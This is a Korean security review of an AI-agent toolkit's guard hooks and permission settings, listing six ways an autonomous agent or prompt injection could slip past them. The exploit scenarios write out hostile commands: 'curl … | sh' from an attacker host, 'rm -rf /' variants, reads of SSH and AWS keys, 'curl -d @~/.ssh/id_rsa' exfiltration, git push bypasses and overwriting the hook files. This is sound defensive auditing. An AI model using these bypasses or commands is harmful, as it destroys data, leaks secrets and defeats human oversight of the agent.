# 보안 리뷰 정리

검토일: 2026-07-02

대상: `bunjang-ai-toolkit` 저장소 전체 — `.hooks/` 방어 훅, `.claude/settings.json` / `.codex/config.toml` 권한 정책, `src/` CLI 래퍼, `install/` 설치 스크립트.

방법론: 보안 관점 전용 리뷰. 카테고리별 finder로 후보를 식별한 뒤, 후보마다 독립 false-positive 필터(confidence 1–10)를 병렬 적용하고 **confidence ≥ 8** 만 정식 발견으로 채택. 후보 29건 → 중복 제거 22건 → 채택 6건.

이전 일반 적대적 리뷰는 `docs/_review.md`에 있음. 본 문서는 보안 익스플로잇 가능성에 초점을 맞추며, `_review.md`가 유지보수성 위주로 다룬 항목 중 **실제 악용 경로가 있는 것**과 `_review.md`에 없던 신규 보안 결함을 다룬다.

## 위협 모델

이 툴킷은 자율 AI 에이전트가 `"defaultMode": "bypassPermissions"` + `"skipDangerousModePermissionPrompt": true`(`.claude/settings.json:34,138`) 상태로 동작하는 것을 전제한다. 이 모드에서 에이전트가 제안하는 Bash/편집 명령은 권한 프롬프트 없이 자동 실행되므로, **`.hooks/`의 PreToolUse 가드가 위험 행위를 막는 사실상 유일한 방어선**이다. 따라서 핵심 보안 관심사는 세 가지다.

- (a) 가드 우회 — 차단 대상 명령이 필터를 통과
- (b) 비밀 파일 접근을 막지 못하는 deny 정책 구멍
- (c) 방어선 자체의 무력화 / 신뢰 경계 밖 코드 실행

## 요약

| # | 위치 | Severity | Category | Confidence | 핵심 |
| --- | --- | --- | --- | --- | --- |
| V1 | `.hooks/pre_tool_use_common.sh:10` | HIGH | security_control_bypass | 9 | 개행→공백 정규화로 4개 Bash 가드 전부 우회 |
| V2 | `.hooks/block_dependency_folder_edits.sh:7` | HIGH | security_control_bypass | 8 | 훅/설정 파일이 편집 차단에서 제외 → 방어선 자기 무력화 |
| V3 | `.claude/settings.json:9` | HIGH | data_exposure | 8 | 비밀 deny가 Read 도구 전용 → Bash `cat`으로 우회 |
| V4 | `.hooks/block_git_origin_push.sh:8` | HIGH | security_control_bypass | 8 | `git -c` / env 접두어로 push 차단 우회 |
| V5 | `.hooks/block_global_system_commands.sh:14` | HIGH | security_control_bypass | 8 | `rm -Rf /`, `rm -rf /*`, 따옴표/홈경로 삭제 통과 |
| V6 | `.hooks/pre_tool_use_common.sh:6` | MEDIUM | security_control_bypass | 8 | jq 미설치/오류 시 fail-open |

이 발견들은 상호 결합해 하나의 킬체인을 이룬다: **V3로 비밀 획득 → V4로 공격자 원격에 push하여 유출** 또는 **V1으로 `curl | sh` 통과하여 임의 코드 실행**, 그리고 **V2로 위 가드들을 영구 무력화**.

---

# Vuln 1: security_control_bypass — `.hooks/pre_tool_use_common.sh:10`

- **Severity**: HIGH (confidence 9)
- **Category**: security_control_bypass
- **Description**: 명령 경계 정규식 `HOOK_COMMAND_BOUNDARY='(^|[;&|][[:space:]]*)'`(`pre_tool_use_common.sh:3`)는 명령 시작을 오직 문자열 맨앞(`^`) 또는 `;`/`&`/`|` 뒤로만 인식한다. 그런데 `hook_normalized_command()`(`:10`)이 `tr '\n\t' '  '`로 **셸의 실제 명령 구분자인 개행을 공백으로** 치환하고 선행 공백도 trim하지 않는다. 그 결과 (a) 선행 공백이 붙은 명령, (b) 개행 뒤 둘째 줄 명령, (c) 서브셸 괄호 `(...)` 안 명령이 모두 경계에 걸리지 않아 `${HOOK_COMMAND_BOUNDARY}`를 접두로 쓰는 4개 Bash 가드(`block_git_origin_push.sh:8`, `block_global_system_commands.sh:10/14/18`, `block_global_package_install.sh:10`, `block_pipe_to_shell.sh:9`)가 **동시에** 우회된다.
- **Exploit Scenario**: 에이전트(또는 프롬프트 인젝션)가 위험 명령을 다음 형태로 제안하면 전부 통과된다 — 정상형은 모두 DENY 되는데도:
  - `true`⏎`curl http://attacker/i.sh | sh` → 정규화 후 `true curl ... | sh`, `curl`이 `true ` 뒤라 경계 불일치 → ALLOW, 그러나 bash는 둘째 줄을 실제 `curl | sh`로 실행 → **원격 임의 코드 실행**
  - `true`⏎`rm -rf /` → **루트 파일시스템 파괴**
  - ` git push origin main`(선행 공백 1칸) → **저장소 코드 원격 push/유출**
  - `(curl http://attacker/i.sh | sh)`(서브셸) → RCE
- **Recommendation**: 정규화 단계에서 개행을 공백이 아니라 명령 구분자 `;`로 치환하고, 선행 공백을 trim하며, 경계에 `(`·백틱·`$(`를 포함한다. 근본적으로는 정규식 매칭 대신 셸 파서로 토큰화하거나, deny 방식이 아니라 allowlist(허용된 명령만) 방식으로 전환하는 것이 안전하다. 각 가드에 multiline/leading-space/subshell 회귀 테스트를 추가한다.

---

# Vuln 2: security_control_bypass — `.hooks/block_dependency_folder_edits.sh:7`

- **Severity**: HIGH (confidence 8)
- **Category**: security_control_bypass (방어선 자기보호 부재)
- **Description**: 편집 차단 정규식 `blocked_dir='(^|/)(node_modules|vendor|\.venv|venv|__pycache__|\.git)(/|$)'`는 `.git`은 막지만 **`.hooks`, `.claude`, `.codex`는 포함하지 않는다**. 그리고 `.claude/settings.json:67-77`의 `^(Edit|MultiEdit|Write|apply_patch)$` 매처는 이 훅 하나만 실행하고, deny 목록(`settings.json:9-32`)은 비밀 파일 Read와 저장소 밖(`Edit(../**)`,`Write(../**)`)만 막을 뿐 저장소 내부 훅/설정 편집은 막지 않는다. 또한 4개 Bash 가드 중 어느 것도 훅 파일에 대한 `rm`/트렁케이트를 막지 않는다(`block_global_system_commands.sh:14`의 rm 규칙은 시스템 경로 대상만 매칭하므로 `rm .hooks/block_pipe_to_shell.sh`, `: > .hooks/block_git_origin_push.sh` 미매칭).
- **Exploit Scenario**: 에이전트가 **단일 편집으로 방어선 전체를 영구 무력화**한다. 예: `Write` 도구로 `.hooks/block_pipe_to_shell.sh`를 빈 파일로 덮어쓰기, 또는 `.claude/settings.json`의 `hooks`/`deny` 블록을 통째로 교체(둘 다 ALLOW). 혹은 Bash `rm .hooks/*.sh`. 이후 V1/V4/V5의 우회조차 필요 없이 모든 위험 명령이 무검사 통과된다. 방어선이 자기 자신을 보호하지 못하는 자기참조 결함이다.
- **Recommendation**: `blocked_dir`에 `(^|/)\.(hooks|claude|codex)(/|$)`를 추가한다. Bash 경로에도 이 디렉터리에 대한 쓰기(`>`,`>>`,`tee`,`rm`,`mv`,`cp`,`chmod`,`sed -i`,`truncate`)를 차단하는 별도 가드를 추가한다. 이상적으로는 훅/설정 파일을 읽기전용 소유권으로 두거나 CI 무결성 검증(체크섬)으로 변조를 탐지한다.

---

# Vuln 3: data_exposure — `.claude/settings.json:9`

- **Severity**: HIGH (confidence 8)
- **Category**: data_exposure (deny 정책 구멍 → 비밀 유출)
- **Description**: 비밀 파일 deny 목록(`settings.json:10-30`: `.env`, `**/*.pem`, `**/id_rsa*`, `**/.aws/*`, `**/.ssh/*`, `**/.git-credentials` 등)이 전부 **`Read(...)` 스코프에만** 적용된다. Bash 명령의 비밀 파일 접근을 검사하는 훅은 존재하지 않는다(4개 Bash 가드는 각각 git push / 시스템 명령 / 전역 설치 / `| sh` 파이프만 검사). `bypassPermissions` + `skipDangerousModePermissionPrompt`이므로 Bash는 프롬프트 없이 실행된다. 추가로 Read 글롭도 불완전하다 — `Read(.env)`/`Read(.env.prod*)`는 루트만 매칭해 `install/.env`, `.env.local`, `.env.development` 등은 Read 도구로도 안 막힌다.
- **Exploit Scenario**: 에이전트가 Read 도구 대신 Bash로 `cat .env`, `cat ~/.aws/credentials`, `cat ~/.ssh/id_rsa`, `cat ~/.git-credentials`를 실행해 deny 정책을 **완전히 우회**하고 자격증명/키를 컨텍스트로 획득한다. 네트워크는 완전 허용 상태(`.codex/config.toml`의 network `"*" = "allow"`, 훅은 `| sh`만 차단)라 `curl -d @~/.ssh/id_rsa http://attacker/`로 곧바로 원격 유출하거나, V4의 `git -c http.extraHeader=<자격증명> push`와 결합해 유출한다. `.codex/config.toml:280-302`는 동일 파일들을 샌드박스 계층에서 `deny`로 강제하므로 보호 의도는 명확하며, Claude 측 Bash 경로만 비어 있다.
- **Recommendation**: 비밀 파일 경로에 대한 Bash 읽기/전송(`cat`/`less`/`cp`/`tar`/`base64`/`curl -d @`/`scp`/`rsync`)을 탐지·차단하는 PreToolUse 훅을 추가한다. Read deny 글롭을 `Read(**/.env)`, `Read(**/.env.*)`로 확장해 Codex 정책과 정렬한다. 근본적으로는 민감 경로를 샌드박스 밖으로 분리해 프로세스가 접근 자체를 못 하게 한다.

---

# Vuln 4: security_control_bypass — `.hooks/block_git_origin_push.sh:8`

- **Severity**: HIGH (confidence 8)
- **Category**: security_control_bypass
- **Description**: `git push` 차단 정규식은 `git`과 `push` 사이에 오직 선택적 `-C <dir>` 하나만 허용한다(`${HOOK_COMMAND_BOUNDARY}(git|...)([[:space:]]+-C[[:space:]]+[^[:space:]]+)?[[:space:]]+push`). 따라서 다른 전역 옵션이 끼거나 env/래퍼 접두어가 붙으면 매칭에 실패한다. `settings.json`에는 Bash git push용 deny 규칙이 없어 이 훅이 유일한 방어선이다.
- **Exploit Scenario**: 정상형 `git push origin main`은 DENY 되지만 다음은 모두 ALLOW —
  - `git -c http.sslVerify=false push origin main` (소문자 `-c`가 `-C`와 불일치)
  - `git -c http.extraHeader="Authorization: ..." push` (자격증명 삽입 + 임의 원격 push)
  - `git --no-pager push origin main`
  - `FOO=1 git push origin main`, `GIT_SSH_COMMAND=... git push` (env 접두어로 `git`이 경계 밖으로 밀림)

  에이전트가 이 중 하나로 저장소 전체 이력(소스·커밋된 비밀 포함)을 공격자 원격에 push해 유출하거나, SSL 검증 비활성화 등 추가 악용을 수행한다.
- **Recommendation**: `git`과 `push` 사이의 임의 옵션 토큰(`[^;&|]*`)을 허용하도록 정규식을 넓히고, 명령 앞 env 할당(`VAR=val ...`)과 `command`/`env`/`xargs` 래퍼 접두어를 정규화 단계에서 제거한 뒤 판정한다. 근본적으로 git 서브명령을 파싱해 판정한다. 훅 이름은 `origin_push`인데 메시지는 모든 push 차단이므로 정책명을 실제 동작과 일치시킨다.

---

# Vuln 5: security_control_bypass — `.hooks/block_global_system_commands.sh:14`

- **Severity**: HIGH (confidence 8)
- **Category**: security_control_bypass
- **Description**: 파괴적 `rm` 차단이 불완전하다. 플래그 패턴 `-(r|f|rf|fr)`(`:14`)은 **소문자만** 인식하고(대문자 `-R` 조합 누락 — 정작 같은 파일의 chmod/chown 규칙은 `-R`을 쓴다), `system_path`(`:9`)의 루트 대안 `/($|[[:space:]])`은 슬래시가 문자열 끝/공백 앞일 때만 매칭한다. `settings.json` 확인 결과 파괴적 rm을 막는 것은 이 훅뿐이다.
- **Exploit Scenario**: 정상형 `rm -rf /`는 DENY 되지만 다음은 모두 ALLOW —
  - `rm -Rf /` (대문자 R)
  - `rm -rf /*` (슬래시 뒤 `*` — 고전적 전체 파일시스템 삭제)
  - `rm -rf "/"` (따옴표로 종결 조건 깨짐)
  - `rm -rf /Users/<user>`, `/home`, `/tmp`, `/private` (system 디렉터리 목록 밖 실사용 경로 무검사 삭제)

  에이전트가 위 명령으로 루트/홈/작업 디렉터리를 파괴한다.
- **Recommendation**: 플래그 매칭을 대소문자 무시로 바꿔 `R`/`Rf`/`fR`를 포함하고, 루트 변형(`/`, `/*`, `"/"`, `'/'`, `/.`)과 따옴표/글롭을 포함하도록 `system_path`를 보강하며, 홈/작업 디렉터리 파괴(`rm -rf .`, `~`, `/Users/*`)도 정책에 추가한다. rm 옵션은 결합 순서가 자유로우므로 단일 alternation 대신 옵션 토큰을 분해해 판정한다.

---

# Vuln 6: security_control_bypass — `.hooks/pre_tool_use_common.sh:6`

- **Severity**: MEDIUM (confidence 8)
- **Category**: security_control_bypass (fail-open)
- **Description**: 모든 가드는 `set -euo pipefail` 하에 `jq` 파이프라인(`hook_command_text() { jq -r '.tool_input.command // ""' }`, `:5-6`)을 돌리고, 차단은 오직 stdout에 deny JSON + exit 0 으로만 신호한다 — 어떤 훅도 exit 2를 내지 않는다. Claude Code PreToolUse 훅은 **exit 2만 '차단'으로 취급**하고 그 외 non-zero는 '비차단 오류(실행 계속)'로 처리한다. 따라서 jq가 없거나(미설치, exit 127) 입력 파싱이 실패하면(exit 5) `pipefail`+`set -e`로 스크립트가 deny 출력 전에 종료되어 위험 명령이 그대로 통과한다.
- **Exploit Scenario**: **jq는 macOS에 기본 탑재되지 않는데**, 설치기(`install/bunjang-assistant-install.mjs:319,345`)는 codex/claude만 검증하고 jq 존재를 검증하지 않으며 README에도 jq 전제조건이 없다. 즉 클린 macOS 환경의 기본 상태가 fail-open이다 — 이 상태에서 4개 Bash 가드 전부가 무력화되어 `sudo rm -rf /etc`, `curl | sh` 등 모든 차단 대상이 허용된다. 입력 정규화를 실패시키는 페이로드로 jq를 오류내 특정 검사를 조용히 통과시키는 것도 가능하다.
- **Recommendation**: 훅을 fail-closed로 설계한다 — jq 존재를 사전 확인하고 없으면 exit 2로 차단, jq/파이프 오류를 `trap`으로 잡아 deny + exit 2 처리, 차단 신호를 stdout JSON뿐 아니라 exit 2로도 이중화한다. 설치기에서 jq를 필수 의존성으로 검증/설치한다.

---

## 임계값 미만 관찰 항목 (confidence < 8, 참고용)

정식 발견 기준(≥8)에는 못 미쳤지만 보안상 검토 가치가 있는 항목:

- **`.codex/config.toml:382` (conf 7)** — `[features] hooks = true`인데 `[hooks]` 정의(406–414행)가 전부 주석이고 `hooks.json`도 없다. `approval_policy = "never"` + `sandbox_mode = "danger-full-access"`라, 이 config가 실제 로드되는 환경이면 Codex 표면엔 `.hooks/` 가드가 전혀 연결되지 않는다. 이 파일이 실제 사용자 설정인지 배포 템플릿인지에 따라 영향도가 갈려 조건부.
- **`src/cli.js:205` (conf 7)** — `query` 등 위치 인자가 `--` end-of-options 구분자 없이 하위 `bunjang-cli`에 전달(CWE-88 인자 주입). spawn이 args 배열이라 셸 주입은 불가하나, `-`-접두 값이 하위 CLI 옵션으로 해석될 수 있다. (`_review.md` m4와 동일 메커니즘, 보안 영향은 제한적.)
- **`.claude/settings.json:24` (conf 6)** / **`.codex/config.toml:280` (conf 7)** — `.env.local`/`.env.development` 등 흔한 변형과 하위 디렉터리 `.env`가 Read deny에서 누락(V3에 부분 포함).
- **`.hooks/block_pipe_to_shell.sh:9` (conf 7)** — 파이프-투-셸 가드도 V1/V4의 경계·접두어 우회에 동일하게 노출.
- **`skills/bunjang/SKILL.md:36` 등 (conf 7)** — 저장소 rename(`bunjang-assistant` → `bunjang-ai-toolkit`) 미반영으로 설치 명령이 GitHub 301 리다이렉트에 의존. 구 이름 저장소 선점 시 공급망 위험. (`_review.md` M2에 상세.)

## 검증 메모

- 6개 finder(command-injection, path-traversal, hook-bypass, access-control, supply-chain, injection-secrets)로 후보 식별 후, 후보별 독립 FP 필터를 병렬 적용(HARD EXCLUSION·PRECEDENT 규칙 적용, confidence 1–10).
- 채택된 발견의 근거 라인은 실제 파일에서 직접 확인: `block_dependency_folder_edits.sh:7`의 `blocked_dir`에 `.hooks|.claude|.codex` 부재, `settings.json`의 deny 목록이 전부 `Read(...)` 스코프이고 Edit/Write 매처가 단일 훅만 실행함을 확인.
- 제외된 대표 항목: 설치기 `--source` allowlist / `--ref` / `CODEX_HOME` 관련 후보는 PRECEDENT 3(환경변수·CLI 플래그는 신뢰값)에 해당해 FP 처리. 설치기 `spawnSync`는 args 배열 사용으로 셸 주입 없음을 확인.
- 하드코딩된 비밀/토큰/자격증명은 발견되지 않음.

저장소 수정은 이 문서 추가만 수행했다.

---

## 추가 검증 및 보정 의견

추가 검증일: 2026-07-02

이 섹션은 기존 보안 발견을 삭제/대체하지 않고, 공식 문서 및 추가 로컬 재현으로 보강하거나 정밀화한 의견이다.

### 공식 문서 대조 결과

- **V1, V4, V5는 유지.** Bash manual은 newline이 command list에서 semicolon 대신 command delimiter가 될 수 있다고 설명한다. 따라서 `pre_tool_use_common.sh`가 newline을 공백으로 바꾸는 것은 실제 shell boundary를 잃는 정규화 결함이다. Git 공식 문서도 `git -c`, `--config-env`, `--no-pager` 같은 전역 option을 `<command>` 앞에 둘 수 있음을 보여 주므로, `block_git_origin_push.sh`가 `-C`만 허용하는 것은 실제 Git 문법을 충분히 덮지 못한다.
- **V2는 유지.** Claude Code hook reference는 PreToolUse가 `Edit`, `Write`, `Bash` 등 도구별로 실행된다고 설명한다. 현재 편집 훅은 `node_modules|vendor|.venv|venv|__pycache__|.git`만 차단하므로, `.hooks`, `.claude`, `.codex` 자기보호 부재는 여전히 맞다.
- **V3는 유지하되, 조건을 명확히 해야 한다.** Claude Code settings 문서에서 permission rule은 `Tool(specifier)` 형태이고 `Read(./.env)`는 Read 도구에 대한 예시다. Hook reference도 Bash tool input과 Read tool input을 별도 schema로 제시한다. 즉 `Read(...)` deny가 Bash `cat .env`까지 자동으로 막는다고 볼 근거는 없다. 단, 실제 파일 접근 가능성은 Claude Code sandbox 설정 및 OS permission에 따라 달라질 수 있다.
- **V6은 일부 표현 정정 필요.** Claude Code hook guide는 `exit 2` 차단과 별도로, `exit 0`에서 stdout JSON의 `permissionDecision: "deny"`도 PreToolUse 도구 호출을 취소한다고 설명한다. 이 저장소 훅이 deny JSON + exit 0을 쓰는 것은 공식 구조화 제어 방식이다. 취약점의 정확한 형태는 `jq` 실패/미설치 시 deny JSON을 만들지 못하고 `exit 2`도 내지 않아, 공식 문서상 "다른 종료 코드: 작업 진행" 경로로 빠질 수 있다는 점이다.
- **위협 모델의 `skipDangerousModePermissionPrompt` 근거는 보정 필요.** Claude Code settings 문서는 `skipDangerousModePermissionPrompt`가 프로젝트 설정(`.claude/settings.json`)에서는 무시된다고 설명한다. 따라서 저장소 파일만으로 "prompt가 생략된다"고 단정하면 안 된다. 다만 세션이 실제로 `bypassPermissions`에 들어간 경우, 이 문서의 Bash/편집 hook 우회 분석은 그대로 적용된다.
- **Codex 관련 조건부 항목은 유지.** Codex config basics는 trusted project에서 `.codex/config.toml` 프로젝트 config를 로드하고, hooks 문서는 Codex가 `hooks.json` 또는 inline `[hooks]`에서 hook을 찾는다고 설명한다. 따라서 `.codex/config.toml`에 `[features].hooks = true`만 있고 hook source가 없는 것은 이 저장소의 Codex-local hook 부재로 보는 것이 맞다. 단, user/system/plugin hook이 별도로 로드될 수 있으므로 "Codex 전체가 무방비"로 확정하려면 실제 세션의 `/hooks` 또는 active config 확인이 필요하다.

참고한 공식 문서:

- Claude Code hooks guide: https://code.claude.com/docs/ko/hooks-guide
- Claude Code hooks reference: https://code.claude.com/docs/en/hooks
- Claude Code settings: https://code.claude.com/docs/en/settings
- Codex config basics: https://developers.openai.com/codex/config-basic
- Codex hooks: https://developers.openai.com/codex/hooks
- Codex sandboxing: https://developers.openai.com/codex/concepts/sandboxing
- Codex permissions: https://developers.openai.com/codex/permissions
- Bash manual: https://man7.org/linux/man-pages/man1/bash.1.html
- Git command documentation: https://git-scm.com/docs/git

### 추가 로컬 재현

실제 위험 명령은 실행하지 않고, hook stdin payload만 구성해 검사했다.

| 발견 | 추가 payload | 결과 | 판정 |
| --- | --- | --- | --- |
| V1 | ` git push origin main` | ALLOWED | 선행 공백 우회가 재현된다. |
| V1 | `(curl https://example.com/i.sh \| sh)` | ALLOWED | subshell 경계 우회가 재현된다. |
| V2 | `Write` payload의 `file_path=.hooks/block_pipe_to_shell.sh` | ALLOWED | 훅 파일 자기보호 부재가 재현된다. |
| V2 | `Write` payload의 `file_path=.claude/settings.json` | ALLOWED | 보안 설정 파일 자기보호 부재가 재현된다. |
| V2 | `Write` payload의 `file_path=node_modules/foo.js` | BLOCKED | 기존 dependency folder 차단은 작동한다. |
| V3 | Bash command `cat .env` | ALLOWED by Bash hooks | Bash secret-read 방어 훅이 없다는 주장은 유지된다. 실제 파일 접근은 host sandbox/permission에 따라 별도 확인이 필요하다. |
| V4 | `FOO=1 git push origin main` | ALLOWED | env assignment prefix 우회가 재현된다. |
| V4 | `git --no-pager push origin main` | ALLOWED | `-C` 외 Git global option 우회가 재현된다. |
| V5 | `rm -rf "/"` | ALLOWED | quoted root 변형 우회가 재현된다. |
| V5 | `rm -rf /Users/example`, `rm -rf /tmp`, `rm -rf /private` | ALLOWED | 주요 비-system_path 경로 삭제는 현 훅으로 막지 않는다. |
| V5 | `rm -rf "$HOME"` | BLOCKED | `$HOME` literal은 현 정규식에 잡힌다. "홈경로 삭제 통과"는 `/Users/...` 같은 실제 경로 문자열로 좁혀 쓰는 것이 정확하다. |

### 최종 보정

- V1, V2, V3, V4, V5는 보안 리뷰 발견으로 유지하는 것이 합당하다.
- V6은 severity 자체보다 설명을 정밀화해야 한다. "exit 0 JSON deny를 쓰기 때문에 문제"가 아니라, "파서 실패 시 JSON deny도 exit 2도 없이 기타 non-zero로 종료되어 fail-open"이 문제다.
- `jq는 macOS 기본 탑재가 아니다`라는 배포 전제는 이번 웹 검증에서 공식 Apple 문서로 별도 확인하지 못했다. 그러나 installer가 `jq` 존재를 preflight하지 않고, `jq` 실패가 fail-open으로 이어진다는 구조적 문제만으로도 V6의 수정 필요성은 남는다.
- `skipDangerousModePermissionPrompt`는 프로젝트 설정에서 무시된다는 공식 문서가 있으므로, 위협 모델의 강한 표현은 "실제 bypassPermissions 세션" 전제로 제한해야 한다.
